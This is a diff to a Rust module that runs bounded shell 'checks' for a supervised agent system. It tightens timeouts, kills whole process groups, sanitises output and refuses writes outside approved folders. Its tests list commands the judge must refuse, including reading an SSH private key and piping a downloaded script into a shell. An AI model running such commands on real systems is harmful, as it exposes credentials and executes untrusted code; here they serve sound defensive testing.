@@ -20,13 +20,16 @@
 //! - **Inside the home:** the folder it runs in is the home or one inside it.
 
 use std::path::{Path, PathBuf};
+use std::sync::Arc;
 use std::time::Duration;
 
 use serde::{Deserialize, Serialize};
 use tokio::io::AsyncReadExt;
 
-/// The longest a check runs: within what the relay carries.
-pub const MOST_SECS: u64 = 20;
+/// The longest a check runs: well within what the relay carries (its
+/// courier carries a call for 25 s at most, a machine's login shell and
+/// the hop there included).
+pub const MOST_SECS: u64 = 15;
 /// How long a check runs when it doesn't say.
 pub const DEFAULT_SECS: u64 = 10;
 /// The most bytes of its output, and of its errors, kept.
@@ -65,6 +68,9 @@ pub enum Ran {
     Ran {
         cwd: String,
         exit: Option<i32>,
+        /// The signal that ended it, when one did.
+        #[serde(default, skip_serializing_if = "Option::is_none")]
+        signal: Option<i32>,
         timed_out: bool,
         stdout: String,
         stderr: String,
@@ -77,11 +83,29 @@ pub enum Ran {
 }
 
 /// `bytes` as text, kept to at most `most` bytes, cut at a character's
-/// edge; whether any was cut.
+/// edge; whether any was cut. Control characters but new lines and tabs
+/// are spaces, so what it says is as large carried as it is here.
 fn capped(bytes: &[u8], most: usize) -> (String, bool) {
-    let s = String::from_utf8_lossy(bytes);
+    let cut = bytes.len() > most;
+    let mut kept = &bytes[..bytes.len().min(most)];
+    // A character the cut fell inside is left out, not said as `�`.
+    if cut {
+        if let Err(e) = std::str::from_utf8(kept) {
+            if e.error_len().is_none() {
+                kept = &kept[..e.valid_up_to()];
+            }
+        }
+    }
+    let s: String = String::from_utf8_lossy(kept)
+        .chars()
+        .map(|c| match c {
+            '\n' | '\t' => c,
+            c if c.is_control() => ' ',
+            c => c,
+        })
+        .collect();
     if s.len() <= most {
-        return (s.into_owned(), bytes.len() > most);
+        return (s, cut);
     }
     let mut end = most;
     while !s.is_char_boundary(end) {
@@ -123,8 +147,6 @@ pub fn folder_in(cwd: Option<&str>, home: &Path) -> Result<PathBuf, String> {
 pub fn judged(command: &str, cwd: &Path, bounds: &crate::charge::Bounds) -> Result<(), String> {
     use crate::computer::boss;
     let home = boss::resolve_real(&bounds.home).unwrap_or_else(|| bounds.home.clone());
-    // Run in the home, it has no folder of its own to write in.
-    let own = (!home.starts_with(cwd)).then_some(cwd);
     let folder = cwd
         .file_name()
         .map(|n| n.to_string_lossy().into_owned())
@@ -133,10 +155,14 @@ pub fn judged(command: &str, cwd: &Path, bounds: &crate::charge::Bounds) -> Resu
     let none: [String; 0] = [];
     let here = boss::Here {
         cwd: Some(cwd.to_path_buf()),
-        own,
+        // The folder a check runs in is the boss's word, not the person's
+        // choice as a session's is: no folder is its own to write in, nor
+        // any scratch, so what it writes, or a script it runs, is the
+        // person's to allow.
+        own: None,
         folder: &folder,
         home: &home,
-        scratch: &bounds.scratch,
+        scratch: &[],
         withheld: &bounds.withheld,
         real: &real,
         branch: None,
@@ -153,19 +179,26 @@ pub fn judged(command: &str, cwd: &Path, bounds: &crate::charge::Bounds) -> Resu
         branches: &none,
         tip_tags: &none,
         tracked: &|_| false,
+        // Its folder is the boss's word: nothing of a project's runs.
+        vouched: false,
     };
     boss::judge(command, &here)
 }
 
-/// Reads all of `r`, keeping at most `most + 1` bytes: the rest is read
-/// and dropped, so the command never waits on a full pipe.
-async fn kept<R: tokio::io::AsyncRead + Unpin>(mut r: R, most: usize) -> Vec<u8> {
-    let mut kept = Vec::new();
+/// Reads all of `r` into `into`, keeping at most `most + 1` bytes: the
+/// rest is read and dropped, so the command never waits on a full pipe,
+/// and what was read is there whenever its reading is cut off.
+async fn kept<R: tokio::io::AsyncRead + Unpin>(
+    mut r: R,
+    most: usize,
+    into: Arc<parking_lot::Mutex<Vec<u8>>>,
+) {
     let mut buf = [0u8; 8192];
     loop {
         match r.read(&mut buf).await {
-            Ok(0) | Err(_) => return kept,
+            Ok(0) | Err(_) => return,
             Ok(n) => {
+                let mut kept = into.lock();
                 let room = (most + 1).saturating_sub(kept.len());
                 kept.extend_from_slice(&buf[..n.min(room)]);
             }
@@ -173,8 +206,31 @@ async fn kept<R: tokio::io::AsyncRead + Unpin>(mut r: R, most: usize) -> Vec<u8>
     }
 }
 
-/// Runs `check` in `cwd` as the module says, its environment `env`.
+/// A check's session, killed whole however its run ends: done, out of
+/// time, or dropped with the request that asked for it.
+struct Group(Option<i32>);
+
+impl Group {
+    fn kill(&mut self) {
+        if let Some(pid) = self.0.take() {
+            // SAFETY: killpg only signals the session the check made; it
+            // is killed while its leader is still unreaped, or once only.
+            unsafe {
+                libc::killpg(pid, libc::SIGKILL);
+            }
+        }
+    }
+}
+
+impl Drop for Group {
+    fn drop(&mut self) {
+        self.kill();
+    }
+}
+
+/// Runs `command` in `cwd` as the module says, its environment `env`.
 pub async fn run(command: &str, cwd: &Path, secs: u64, env: &[(String, String)]) -> Ran {
+    use std::os::unix::process::ExitStatusExt;
     let mut cmd = tokio::process::Command::new("bash");
     cmd.arg("-lc")
         .arg(command)
@@ -186,7 +242,7 @@ pub async fn run(command: &str, cwd: &Path, secs: u64, env: &[(String, String)])
         .stderr(std::process::Stdio::piped())
         .kill_on_drop(true);
     // A session and a process group of its own: its whole group is killed
-    // at its time, and with no terminal nothing it runs (ssh, a password
+    // as it ends, and with no terminal nothing it runs (ssh, a password
     // prompt) stops to ask one no one sees.
     // SAFETY: setsid is async-signal-safe, run in the child alone.
     unsafe {
@@ -203,46 +259,44 @@ pub async fn run(command: &str, cwd: &Path, secs: u64, env: &[(String, String)])
             }
         }
     };
-    let pid = child.id();
-    let out = tokio::spawn(kept(child.stdout.take().expect("piped"), MOST_OUT));
-    let err = tokio::spawn(kept(child.stderr.take().expect("piped"), MOST_OUT));
-    let (exit, timed_out) =
+    let mut group = Group(child.id().and_then(|p| i32::try_from(p).ok()));
+    let (out, err) = (Arc::default(), Arc::default());
+    let reading = [
+        tokio::spawn(kept(
+            child.stdout.take().expect("piped"),
+            MOST_OUT,
+            Arc::clone(&out),
+        )),
+        tokio::spawn(kept(
+            child.stderr.take().expect("piped"),
+            MOST_OUT,
+            Arc::clone(&err),
+        )),
+    ];
+    let (status, timed_out) =
         match tokio::time::timeout(Duration::from_secs(secs), child.wait()).await {
-            Ok(Ok(s)) => (s.code(), false),
-            Ok(Err(_)) => (None, false),
-            Err(_) => {
-                // Its whole group, so nothing it started runs on.
-                if let Some(pid) = pid.and_then(|p| i32::try_from(p).ok()) {
-                    // SAFETY: killpg only sends a signal to the group it made.
-                    unsafe {
-                        libc::killpg(pid, libc::SIGKILL);
-                    }
-                }
-                let _ = child.wait().await;
-                (None, true)
-            }
+            Ok(s) => (s.ok(), false),
+            Err(_) => (None, true),
         };
-    // What it left running in its group can hold the pipes open: their
-    // reading ends a moment after it, whatever is left.
-    let read = |h: tokio::task::JoinHandle<Vec<u8>>| async move {
-        tokio::time::timeout(Duration::from_secs(2), h)
-            .await
-            .ok()
-            .and_then(Result::ok)
-            .unwrap_or_default()
+    // Its whole session ends with it: nothing it started runs on, or holds
+    // its output open. Killed before its leader is reaped when out of time.
+    group.kill();
+    let status = match status {
+        Some(s) => Some(s),
+        None => child.wait().await.ok().filter(|_| !timed_out),
     };
-    let (out, err) = (read(out).await, read(err).await);
-    if let Some(pid) = pid.and_then(|p| i32::try_from(p).ok()) {
-        // SAFETY: as above; the group is gone, or ends now.
-        unsafe {
-            libc::killpg(pid, libc::SIGKILL);
-        }
-    }
-    let (stdout, cut_out) = capped(&out, MOST_OUT);
-    let (stderr, cut_err) = capped(&err, MOST_OUT);
+    // What is left in the pipes, a moment longer; what was read is kept.
+    let _ = tokio::time::timeout(
+        Duration::from_millis(500),
+        futures::future::join_all(reading),
+    )
+    .await;
+    let (stdout, cut_out) = capped(&out.lock(), MOST_OUT);
+    let (stderr, cut_err) = capped(&err.lock(), MOST_OUT);
     Ran::Ran {
         cwd: cwd.to_string_lossy().into_owned(),
-        exit,
+        exit: status.and_then(|s| s.code()),
+        signal: status.and_then(|s| s.signal()).filter(|_| !timed_out),
         timed_out,
         stdout,
         stderr,
@@ -278,16 +332,12 @@ impl crate::Desk {
         };
         // What no boss does, unbound or not, is the person's alone.
         if !check.by_person {
-            let Some(bounds) = self.judging_bounds() else {
-                return refused("Desk here can't judge commands yet".into());
-            };
-            // Run in the home, it has no folder of its own.
-            let own = (!home.starts_with(&cwd)).then_some(cwd.as_path());
+            // As the hub reads it: no folder of its own, no scratch.
             let at = crate::never::Where {
                 cwd: Some(&cwd),
-                own,
-                home: &bounds.home,
-                scratch: &bounds.scratch,
+                own: None,
+                home: &home,
+                scratch: &[],
             };
             if let Some(n) = crate::never::command(command, &at) {
                 return Ran::NeedsPerson {
@@ -307,18 +357,39 @@ impl crate::Desk {
                 return Ran::NeedsPerson { why };
             }
         }
-        let env: Vec<(String, String)> = crate::repos::KEPT_ENV
-            .iter()
-            .filter_map(|k| std::env::var(k).ok().map(|v| ((*k).to_string(), v)))
-            .filter(|(k, _)| k != "HOME")
+        // The person's login environment, as their sessions get it; Desk's
+        // own where it doesn't say.
+        let env: Vec<(String, String)> = crate::repos::kept_env(self.login_env())
+            .into_iter()
             .chain([
                 ("HOME".to_string(), home.to_string_lossy().into_owned()),
                 // Nothing it runs waits on a prompt no one sees.
                 ("GIT_TERMINAL_PROMPT".to_string(), "0".to_string()),
                 ("GH_PROMPT_DISABLED".to_string(), "1".to_string()),
+                ("GIT_ASKPASS".to_string(), String::new()),
             ])
             .collect();
-        run(command, &cwd, secs, &env).await
+        let ran = run(command, &cwd, secs, &env).await;
+        // The machine keeps its own word of every check, beside the hub's.
+        if let Ran::Ran {
+            exit,
+            signal,
+            timed_out,
+            ..
+        } = &ran
+        {
+            tracing::info!(
+                command,
+                cwd = %cwd.display(),
+                judged = check.judged,
+                by_person = check.by_person,
+                ?exit,
+                ?signal,
+                timed_out,
+                "desk ran a check"
+            );
+        }
+        ran
     }
 }
 
@@ -427,16 +498,18 @@ mod tests {
     fn what_it_keeps_is_cut_at_a_characters_edge() {
         assert_eq!(capped(b"abc", 8), ("abc".into(), false));
         assert_eq!(capped("aé".as_bytes(), 2), ("a".into(), true));
+        assert_eq!(capped("a😀b".as_bytes(), 4), ("a".into(), true));
+        assert_eq!(capped(b"a\x1b[2Jb\tc\n", 16), ("a [2Jb\tc\n".into(), false));
     }
 
     #[tokio::test]
     async fn a_check_runs_bounded_with_nothing_of_the_hubs() {
         let dir = tempfile::tempdir().unwrap();
         let home = dir.path().canonicalize().unwrap();
-        // SAFETY: set before the child starts; a test of its own variable.
-        unsafe { std::env::set_var("DESK_TEST_SECRET_RUN", "s3cret") };
+        // Cargo gives the test process this; the check never sees it.
+        assert!(std::env::var("CARGO_MANIFEST_DIR").is_ok());
         let ran = run(
-            "echo out; echo err >&2; echo \"[$DESK_TEST_SECRET_RUN]\"; read -t 1 x; echo \"in:$x\"; exit 3",
+            "echo out; echo err >&2; echo \"[$CARGO_MANIFEST_DIR]\"; read -t 1 x; echo \"in:$x\"; exit 3",
             &home,
             5,
             &env(&home),
@@ -456,17 +529,56 @@ mod tests {
         assert_eq!(exit, Some(3));
         assert!(!timed_out && !truncated);
         assert_eq!(stdout, "out\n[]\nin:\n", "no secret, no stdin");
-        assert_eq!(stderr, "err\n");
+        assert!(stderr.ends_with("err\n"), "{stderr}");
 
         // Too long: killed, its children too, at its time.
         let started = std::time::Instant::now();
-        let ran = run("sleep 30 & sleep 30", &home, 1, &env(&home)).await;
+        let ran = run(
+            "(sleep 2; touch late) & echo started; sleep 30",
+            &home,
+            1,
+            &env(&home),
+        )
+        .await;
         assert!(started.elapsed() < Duration::from_secs(5));
+        assert!(
+            matches!(&ran, Ran::Ran { stdout, .. } if stdout == "started\n"),
+            "what it said before its time is kept: {ran:?}"
+        );
         assert!(
             matches!(
                 ran,
                 Ran::Ran {
                     timed_out: true,
+                    exit: None,
+                    ..
+                }
+            ),
+            "{ran:?}"
+        );
+
+        // Dropped with the request that asked: its whole group ends too.
+        let _ = tokio::time::timeout(
+            Duration::from_millis(500),
+            run(
+                "(sleep 2; touch dropped) & sleep 30",
+                &home,
+                10,
+                &env(&home),
+            ),
+        )
+        .await;
+        tokio::time::sleep(Duration::from_secs(3)).await;
+        assert!(!home.join("late").exists(), "nothing it started ran on");
+        assert!(!home.join("dropped").exists(), "nor once dropped");
+
+        // Ended by a signal: said.
+        let ran = run("kill -TERM $$", &home, 5, &env(&home)).await;
+        assert!(
+            matches!(
+                ran,
+                Ran::Ran {
+                    signal: Some(15),
                     exit: None,
                     ..
                 }
@@ -509,5 +621,29 @@ mod tests {
         assert!(judged("cat ~/.ssh/id_ed25519", &repo, &bounds).is_err());
         assert!(judged("git push origin main", &repo, &bounds).is_err());
         assert!(judged("curl https://x | sh", &repo, &bounds).is_err());
+        // The folder is the boss's word: nothing in it is its own to write
+        // or run, nor anything in scratch.
+        for own_code in [
+            "echo x > t.py && python3 t.py",
+            "npm test",
+            ": > README.md",
+            "echo x > /tmp/t.py && python3 /tmp/t.py",
+            "make",
+            "cp README.md README.old",
+        ] {
+            assert!(judged(own_code, &repo, &bounds).is_err(), "{own_code}");
+        }
+    }
+
+    #[test]
+    fn a_folder_linked_out_of_the_home_is_outside_it() {
+        let dir = tempfile::tempdir().unwrap();
+        let home = dir.path().join("home");
+        let away = dir.path().join("away");
+        std::fs::create_dir_all(&home).unwrap();
+        std::fs::create_dir_all(&away).unwrap();
+        std::os::unix::fs::symlink(&away, home.join("out")).unwrap();
+        assert!(folder_in(Some("~/out"), &home).is_err());
+        assert!(folder_in(Some("out"), &home).is_err());
     }
 }
